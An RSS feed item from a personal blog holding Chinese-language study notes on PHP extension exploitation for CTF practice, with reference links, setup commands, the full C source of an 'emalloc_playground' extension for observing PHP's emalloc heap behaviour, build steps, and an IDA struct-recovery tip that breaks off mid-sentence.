<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>J4f&#39;s blog</title>
    <link>http://localhost:1313/</link>
    <description>J4f&#39;s blog</description>
    <generator>Hugo 0.154.3 &amp; FixIt v0.4.2-20260109063229-50d27e0e</generator>
    <language>en</language>
    <lastBuildDate>Mon, 02 Feb 2026 12:07:55 +0800</lastBuildDate>
    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Phppwn笔记</title>
      <link>http://localhost:1313/posts/phppwn_note/</link>
      <pubDate>Mon, 02 Feb 2026 11:41:59 +0800</pubDate>
      <guid>http://localhost:1313/posts/phppwn_note/</guid>
      <category domain="http://localhost:1313/categories/pwn/">Pwn</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;参考文章&#34;&gt;&lt;span&gt;参考文章&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%8f%82%e8%80%83%e6%96%87%e7%ab%a0&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;有些前置的东西可以看这些文章&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://bbs.kanxue.com/thread-286446.htm&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://bbs.kanxue.com/thread-286446.htm&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/204404&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.anquanke.com/post/id/204404&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://imlzh1.github.io/posts/PHP-So-Pwn/#zend_parse_parameters&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://imlzh1.github.io/posts/PHP-So-Pwn/#zend_parse_parameters&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://www.bookstack.cn/read/php7-internal/7-implement.md&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.bookstack.cn/read/php7-internal/7-implement.md&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/05/mixture/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://xuanxuanblingbling.github.io/ctf/pwn/2020/05/05/mixture/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;‍&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;笔记&#34;&gt;&lt;span&gt;笔记&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%ac%94%e8%ae%b0&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;常用&#34;&gt;&lt;span&gt;常用&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%b8%b8%e7%94%a8&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;搭建镜像的时候，要下载&lt;code&gt;gdbserver&lt;/code&gt;和&lt;code&gt;vim&lt;/code&gt;，方便后面做题&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;RUN apt-get install -y gdbserver vim&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看配置和扩展：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;php -i | grep -E &amp;#34;disable_functions|disable_classes|extension = |Loaded Configuration File|extension_dir&amp;#34;&#xD;&#xA;php -m | grep hackphp&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;emalloc_playground&#34;&gt;&lt;span&gt;emalloc_playground&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#emalloc_playground&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;写了一个类似&lt;code&gt;how2heap&lt;/code&gt;的&lt;code&gt;malloc_playground&lt;/code&gt;的扩展，用于理解&lt;code&gt;emalloc&lt;/code&gt;的底层行为&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;//emalloc_playground.c&#xD;&#xA;/* emalloc_playground extension for PHP */&#xD;&#xA;#ifdef HAVE_CONFIG_H&#xD;&#xA;#include &amp;#34;config.h&amp;#34;&#xD;&#xA;#endif&#xD;&#xA;&#xD;&#xA;#include &amp;#34;php.h&amp;#34;&#xD;&#xA;#include &amp;#34;php_emalloc_playground.h&amp;#34;&#xD;&#xA;#include &amp;#34;emalloc_playground_arginfo.h&amp;#34;&#xD;&#xA;#include &amp;lt;stdio.h&amp;gt;&#xD;&#xA;#include &amp;lt;stdlib.h&amp;gt;&#xD;&#xA;#include &amp;lt;inttypes.h&amp;gt;&#xD;&#xA;#include &amp;lt;ctype.h&amp;gt;&#xD;&#xA;#include &amp;lt;string.h&amp;gt;&#xD;&#xA;#include &amp;lt;sys/types.h&amp;gt;&#xD;&#xA;#include &amp;lt;unistd.h&amp;gt;&#xD;&#xA;&#xD;&#xA;/* 分配记录结构 */&#xD;&#xA;typedef struct {&#xD;&#xA;    void *ptr;&#xD;&#xA;    size_t size;&#xD;&#xA;} allocation_t;&#xD;&#xA;&#xD;&#xA;/* 全局状态 */&#xD;&#xA;static struct {&#xD;&#xA;    allocation_t *allocations;&#xD;&#xA;    size_t count;&#xD;&#xA;    size_t capacity;&#xD;&#xA;    zend_bool initialized;&#xD;&#xA;} playground_state = {0};&#xD;&#xA;&#xD;&#xA;/* 初始化模块 */&#xD;&#xA;PHP_MINIT_FUNCTION(emalloc_playground)&#xD;&#xA;{&#xD;&#xA;    playground_state.allocations = ecalloc(8, sizeof(allocation_t));&#xD;&#xA;    playground_state.capacity = 8;&#xD;&#xA;    playground_state.count = 0;&#xD;&#xA;    playground_state.initialized = 1;&#xD;&#xA;    return SUCCESS;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;/* 关闭模块 */&#xD;&#xA;PHP_MSHUTDOWN_FUNCTION(emalloc_playground)&#xD;&#xA;{&#xD;&#xA;    if (playground_state.initialized) {&#xD;&#xA;        for (size_t i = 0; i &amp;lt; playground_state.count; i&amp;#43;&amp;#43;) {&#xD;&#xA;            if (playground_state.allocations[i].ptr) {&#xD;&#xA;                efree(playground_state.allocations[i].ptr);&#xD;&#xA;            }&#xD;&#xA;        }&#xD;&#xA;        efree(playground_state.allocations);&#xD;&#xA;        playground_state.initialized = 0;&#xD;&#xA;    }&#xD;&#xA;    return SUCCESS;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;/* 辅助函数：移除首尾空格 */&#xD;&#xA;static void string_trim(char *s) {&#xD;&#xA;    char *p = s;&#xD;&#xA;    while (isspace((unsigned char)*p)) p&amp;#43;&amp;#43;;&#xD;&#xA;    if (p != s) memmove(s, p, strlen(p) &amp;#43; 1);&#xD;&#xA;    size_t len = strlen(s);&#xD;&#xA;    while (len &amp;gt; 0 &amp;amp;&amp;amp; isspace((unsigned char)s[len-1])) s[--len] = &amp;#39;\0&amp;#39;;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;/* 解析大小字符串（支持十六进制） */&#xD;&#xA;static size_t parse_size_string(const char *s) {&#xD;&#xA;    if (!s) return 0;&#xD;&#xA;    while (isspace((unsigned char)*s)) s&amp;#43;&amp;#43;;&#xD;&#xA;    if (s[0]==&amp;#39;0&amp;#39; &amp;amp;&amp;amp; (s[1]==&amp;#39;x&amp;#39; || s[1]==&amp;#39;X&amp;#39;)) {&#xD;&#xA;        return (size_t) strtoull(s&amp;#43;2, NULL, 16);&#xD;&#xA;    } else {&#xD;&#xA;        return (size_t) strtoull(s, NULL, 10);&#xD;&#xA;    }&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;/* 添加新分配记录 */&#xD;&#xA;static size_t add_allocation(void *ptr, size_t size) {&#xD;&#xA;    if (!playground_state.initialized) return SIZE_MAX;&#xD;&#xA;    &#xD;&#xA;    if (playground_state.count &amp;#43; 1 &amp;gt; playground_state.capacity) {&#xD;&#xA;        size_t newcap = playground_state.capacity * 2;&#xD;&#xA;        allocation_t *newalloc = erealloc(&#xD;&#xA;            playground_state.allocations, &#xD;&#xA;            sizeof(allocation_t) * newcap&#xD;&#xA;        );&#xD;&#xA;        if (!newalloc) return SIZE_MAX;&#xD;&#xA;        &#xD;&#xA;        playground_state.allocations = newalloc;&#xD;&#xA;        playground_state.capacity = newcap;&#xD;&#xA;    }&#xD;&#xA;    &#xD;&#xA;    playground_state.allocations[playground_state.count].ptr = ptr;&#xD;&#xA;    playground_state.allocations[playground_state.count].size = size;&#xD;&#xA;    return playground_state.count&amp;#43;&amp;#43;;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;/* 核心交互函数 */&#xD;&#xA;PHP_FUNCTION(emalloc_playground)&#xD;&#xA;{&#xD;&#xA;    ZEND_PARSE_PARAMETERS_NONE();&#xD;&#xA;    &#xD;&#xA;    if (!playground_state.initialized) {&#xD;&#xA;        php_error(E_WARNING, &amp;#34;Playground not initialized&amp;#34;);&#xD;&#xA;        RETURN_FALSE;&#xD;&#xA;    }&#xD;&#xA;&#xD;&#xA;    pid_t pid = getpid();&#xD;&#xA;    php_printf(&amp;#34;=== PHP emalloc Playground ===\n&amp;#34;);&#xD;&#xA;    php_printf(&amp;#34;PID: %d\n&amp;#34;, (int)pid);&#xD;&#xA;    php_printf(&amp;#34;Type &amp;#39;help&amp;#39; for commands\n&amp;#34;);&#xD;&#xA;&#xD;&#xA;    char linebuf[512];&#xD;&#xA;    while (1) {&#xD;&#xA;        php_printf(&amp;#34;&amp;gt; &amp;#34;);&#xD;&#xA;        if (fgets(linebuf, sizeof(linebuf), stdin) == NULL) {&#xD;&#xA;            php_printf(&amp;#34;\nExit: EOF received\n&amp;#34;);&#xD;&#xA;            break;&#xD;&#xA;        }&#xD;&#xA;        &#xD;&#xA;        string_trim(linebuf);&#xD;&#xA;        if (linebuf[0] == &amp;#39;\0&amp;#39;) continue;&#xD;&#xA;&#xD;&#xA;        char *cmd = strtok(linebuf, &amp;#34; \t&amp;#34;);&#xD;&#xA;        if (!cmd) continue;&#xD;&#xA;&#xD;&#xA;        if (strcmp(cmd, &amp;#34;exit&amp;#34;) == 0 || strcmp(cmd, &amp;#34;quit&amp;#34;) == 0) {&#xD;&#xA;            php_printf(&amp;#34;Exiting playground\n&amp;#34;);&#xD;&#xA;            break;&#xD;&#xA;&#xD;&#xA;        } else if (strcmp(cmd, &amp;#34;pid&amp;#34;) == 0) {&#xD;&#xA;            php_printf(&amp;#34;Process ID: %d\n&amp;#34;, (int)pid);&#xD;&#xA;&#xD;&#xA;        } else if (strcmp(cmd, &amp;#34;emalloc&amp;#34;) == 0 ||strcmp(cmd, &amp;#34;malloc&amp;#34;) == 0) {&#xD;&#xA;            char *arg = strtok(NULL, &amp;#34; \t&amp;#34;);&#xD;&#xA;            size_t sz = parse_size_string(arg);&#xD;&#xA;            &#xD;&#xA;            if (sz == 0) {&#xD;&#xA;                php_printf(&amp;#34;Error: Size must be &amp;gt; 0\n&amp;#34;);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;&#xD;&#xA;            void *p = emalloc(sz);&#xD;&#xA;            memset(p, 0xCC, sz); // 填充测试模式&#xD;&#xA;            &#xD;&#xA;            size_t idx = add_allocation(p, sz);&#xD;&#xA;            if (idx == SIZE_MAX) {&#xD;&#xA;                php_printf(&amp;#34;Error: Failed to store allocation\n&amp;#34;);&#xD;&#xA;                efree(p);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;            &#xD;&#xA;            php_printf(&amp;#34;[%zu] Allocated %zu bytes at 0x%&amp;#34; PRIxPTR &amp;#34;\n&amp;#34;, &#xD;&#xA;                      idx, sz, (uintptr_t)p);&#xD;&#xA;&#xD;&#xA;        } else if (strcmp(cmd, &amp;#34;calloc&amp;#34;) == 0) {&#xD;&#xA;            char *arg1 = strtok(NULL, &amp;#34; \t&amp;#34;);&#xD;&#xA;            char *arg2 = strtok(NULL, &amp;#34; \t&amp;#34;);&#xD;&#xA;            size_t nm = parse_size_string(arg1);&#xD;&#xA;            size_t sz = parse_size_string(arg2);&#xD;&#xA;            &#xD;&#xA;            if (nm == 0 || sz == 0) {&#xD;&#xA;                php_printf(&amp;#34;Error: Invalid calloc parameters\n&amp;#34;);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;&#xD;&#xA;            size_t total_size;&#xD;&#xA;            if (__builtin_mul_overflow(nm, sz, &amp;amp;total_size)) {&#xD;&#xA;                php_printf(&amp;#34;Error: Size overflow\n&amp;#34;);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;&#xD;&#xA;            void *p = ecalloc(nm, sz);&#xD;&#xA;            size_t idx = add_allocation(p, total_size);&#xD;&#xA;            if (idx == SIZE_MAX) {&#xD;&#xA;                php_printf(&amp;#34;Error: Failed to store allocation\n&amp;#34;);&#xD;&#xA;                efree(p);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;            &#xD;&#xA;            php_printf(&amp;#34;[%zu] Calloc allocated %zu bytes at 0x%&amp;#34; PRIxPTR &amp;#34;\n&amp;#34;, &#xD;&#xA;                      idx, total_size, (uintptr_t)p);&#xD;&#xA;&#xD;&#xA;        } else if (strcmp(cmd, &amp;#34;realloc&amp;#34;) == 0) {&#xD;&#xA;            char *idxs = strtok(NULL, &amp;#34; \t&amp;#34;);&#xD;&#xA;            char *szs = strtok(NULL, &amp;#34; \t&amp;#34;);&#xD;&#xA;            if (!idxs || !szs) {&#xD;&#xA;                php_printf(&amp;#34;Usage: realloc &amp;lt;index&amp;gt; &amp;lt;size&amp;gt;\n&amp;#34;);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;            &#xD;&#xA;            size_t idx = (size_t) strtoull(idxs, NULL, 10);&#xD;&#xA;            size_t newsz = parse_size_string(szs);&#xD;&#xA;            &#xD;&#xA;            if (idx &amp;gt;= playground_state.count || &#xD;&#xA;                !playground_state.allocations[idx].ptr) {&#xD;&#xA;                php_printf(&amp;#34;Error: Invalid index %zu\n&amp;#34;, idx);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;            &#xD;&#xA;            void *oldp = playground_state.allocations[idx].ptr;&#xD;&#xA;            void *newp = erealloc(oldp, newsz);&#xD;&#xA;            &#xD;&#xA;            if (!newp &amp;amp;&amp;amp; newsz &amp;gt; 0) {&#xD;&#xA;                php_printf(&amp;#34;Error: Realloc failed for index %zu\n&amp;#34;, idx);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;            &#xD;&#xA;            playground_state.allocations[idx].ptr = newp;&#xD;&#xA;            playground_state.allocations[idx].size = newsz;&#xD;&#xA;            &#xD;&#xA;            php_printf(&amp;#34;[%zu] Reallocated to %zu bytes at 0x%&amp;#34; PRIxPTR &amp;#34;\n&amp;#34;, &#xD;&#xA;                      idx, newsz, (uintptr_t)newp);&#xD;&#xA;&#xD;&#xA;        } else if (strcmp(cmd, &amp;#34;free&amp;#34;) == 0) {&#xD;&#xA;            char *idxs = strtok(NULL, &amp;#34; \t&amp;#34;);&#xD;&#xA;            if (!idxs) {&#xD;&#xA;                php_printf(&amp;#34;Usage: free &amp;lt;index&amp;gt;\n&amp;#34;);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;            &#xD;&#xA;            size_t idx = (size_t) strtoull(idxs, NULL, 10);&#xD;&#xA;            if (idx &amp;gt;= playground_state.count || &#xD;&#xA;                !playground_state.allocations[idx].ptr) {&#xD;&#xA;                php_printf(&amp;#34;Error: Invalid index %zu\n&amp;#34;, idx);&#xD;&#xA;                continue;&#xD;&#xA;            }&#xD;&#xA;            &#xD;&#xA;            efree(playground_state.allocations[idx].ptr);&#xD;&#xA;            playground_state.allocations[idx].ptr = NULL;&#xD;&#xA;            playground_state.allocations[idx].size = 0;&#xD;&#xA;            php_printf(&amp;#34;[%zu] Freed\n&amp;#34;, idx);&#xD;&#xA;&#xD;&#xA;        } else if (strcmp(cmd, &amp;#34;show&amp;#34;) == 0 || strcmp(cmd, &amp;#34;list&amp;#34;) == 0) {&#xD;&#xA;            php_printf(&amp;#34;\nActive Allocations:\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;Index   Address          Size\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;--------------------------------\n&amp;#34;);&#xD;&#xA;            &#xD;&#xA;            for (size_t i = 0; i &amp;lt; playground_state.count; i&amp;#43;&amp;#43;) {&#xD;&#xA;                if (playground_state.allocations[i].ptr) {&#xD;&#xA;                    php_printf(&amp;#34;%-6zu  0x%-14&amp;#34; PRIxPTR &amp;#34;  %zu\n&amp;#34;, &#xD;&#xA;                              i, &#xD;&#xA;                              (uintptr_t)playground_state.allocations[i].ptr,&#xD;&#xA;                              playground_state.allocations[i].size);&#xD;&#xA;                }&#xD;&#xA;            }&#xD;&#xA;&#xD;&#xA;        } else if (strcmp(cmd, &amp;#34;clear&amp;#34;) == 0) {&#xD;&#xA;            size_t freed = 0;&#xD;&#xA;            for (size_t i = 0; i &amp;lt; playground_state.count; i&amp;#43;&amp;#43;) {&#xD;&#xA;                if (playground_state.allocations[i].ptr) {&#xD;&#xA;                    efree(playground_state.allocations[i].ptr);&#xD;&#xA;                    playground_state.allocations[i].ptr = NULL;&#xD;&#xA;                    playground_state.allocations[i].size = 0;&#xD;&#xA;                    freed&amp;#43;&amp;#43;;&#xD;&#xA;                }&#xD;&#xA;            }&#xD;&#xA;            php_printf(&amp;#34;Freed %zu allocations\n&amp;#34;, freed);&#xD;&#xA;&#xD;&#xA;        } else if (strcmp(cmd, &amp;#34;help&amp;#34;) == 0) {&#xD;&#xA;            php_printf(&amp;#34;\nAvailable Commands:\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  malloc &amp;lt;size&amp;gt;       - Allocate memory (e.g., malloc 1024)\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  calloc &amp;lt;num&amp;gt; &amp;lt;size&amp;gt; - Allocate zeroed memory\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  realloc &amp;lt;idx&amp;gt; &amp;lt;size&amp;gt;- Resize allocation\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  free &amp;lt;idx&amp;gt;          - Free allocation\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  show                - List active allocations\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  clear               - Free all allocations\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  pid                 - Show process ID\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  help                - Show this help\n&amp;#34;);&#xD;&#xA;            php_printf(&amp;#34;  exit/quit           - Exit playground\n&amp;#34;);&#xD;&#xA;&#xD;&#xA;        } else {&#xD;&#xA;            php_printf(&amp;#34;Unknown command: &amp;#39;%s&amp;#39; (type &amp;#39;help&amp;#39; for commands)\n&amp;#34;, cmd);&#xD;&#xA;        }&#xD;&#xA;    }&#xD;&#xA;    &#xD;&#xA;    RETURN_TRUE;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;/* 扩展函数列表 */&#xD;&#xA;static const zend_function_entry emalloc_playground_functions[] = {&#xD;&#xA;    PHP_FE(emalloc_playground, arginfo_emalloc_playground)&#xD;&#xA;    PHP_FE_END&#xD;&#xA;};&#xD;&#xA;&#xD;&#xA;/* 模块入口 */&#xD;&#xA;zend_module_entry emalloc_playground_module_entry = {&#xD;&#xA;    STANDARD_MODULE_HEADER,&#xD;&#xA;    &amp;#34;emalloc_playground&amp;#34;,                    /* Extension name */&#xD;&#xA;    emalloc_playground_functions,            /* Function entries */&#xD;&#xA;    PHP_MINIT(emalloc_playground),           /* Module init */&#xD;&#xA;    PHP_MSHUTDOWN(emalloc_playground),       /* Module shutdown */&#xD;&#xA;    NULL,                                    /* Request init */&#xD;&#xA;    NULL,                                    /* Request shutdown */&#xD;&#xA;    NULL,                                    /* Module info */&#xD;&#xA;    &amp;#34;1.0&amp;#34;,                                   /* Version */&#xD;&#xA;    STANDARD_MODULE_PROPERTIES&#xD;&#xA;};&#xD;&#xA;&#xD;&#xA;#ifdef COMPILE_DL_EMALLOC_PLAYGROUND&#xD;&#xA;ZEND_GET_MODULE(emalloc_playground)&#xD;&#xA;#endif&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;emalloc_playground.stub.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xD;&#xA;&#xD;&#xA;/**&#xD;&#xA; * @generate-class-entries&#xD;&#xA; * @undocumentable&#xD;&#xA; */&#xD;&#xA;&#xD;&#xA; function emalloc_playground(): bool {}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;php ./ext_skel.php --ext emalloc_playground --onlyunix --vendor &amp;#34;j4f&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后将上面的两个文件复制进相应的文件里&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;phpize&#xD;&#xA;./configure --with-php-config=/usr/bin/php-config&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;这里我修改了&lt;code&gt;Makefile&lt;/code&gt;中的CFLAGS为&lt;code&gt;CFLAGS = -g3 -O0&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;pre&gt;&lt;code&gt;make&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后把生成的扩展文件复制进&lt;code&gt;extension_dir&lt;/code&gt;，在&lt;code&gt;php.ini&lt;/code&gt;中加上&lt;code&gt;extension=emalloc_playground.so&lt;/code&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;ida逆向&#34;&gt;&lt;span&gt;ida逆向&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#ida%e9%80%86%e5%90%91&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;在phppwn逆向的时候，常遇到类似这样的东西：&lt;/p&gt;&#xA;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/img/phppwn/phppwn_re_struct/php_re_struct.png&#34; title=&#34;/img/phppwn/phppwn_re_struct/php_re_struct.png&#34; data-thumbnail=&#34;/img/phppwn/phppwn_re_struct/php_re_struct.png&#34; data-sub-html=&#34;&lt;h2&gt;/img/phppwn/phppwn_re_struct/php_re_struct.png&lt;/h2&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/img/phppwn/phppwn_re_struct/php_re_struct.png&#39; alt=&#34;/img/phppwn/phppwn_re_struct/php_re_struct.png&#34; width=&#34;900px&#34;&gt;&lt;/a&gt;&#xA;&lt;p&gt;其实它是对传入参数的类型进行判断，但是看起来不太直观&lt;/p&gt;&#xA;&lt;p&gt;IDA中支持导入C头文件，修复一些结构体&lt;/p&gt;&#xA;&lt;p&gt;修复后：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( v15-&amp;gt;u1.v.type == IS_ARRAY )&#xD;&#xA;    {&#xD;&#xA;      if ( v16-&amp;gt;u1.v.type == IS_STRING )&#xD;&#xA;      {&lt;/code&gt;&lt;/pre&gt;&lt;br&gt;&#xD;&#xA;&lt;p&gt;导入方式：&lt;code&gt;File&lt;/code&gt; -&amp;gt; &lt;code&gt;Load file&lt;/code&gt; -&amp;gt;  &lt;code&gt;Parse C header 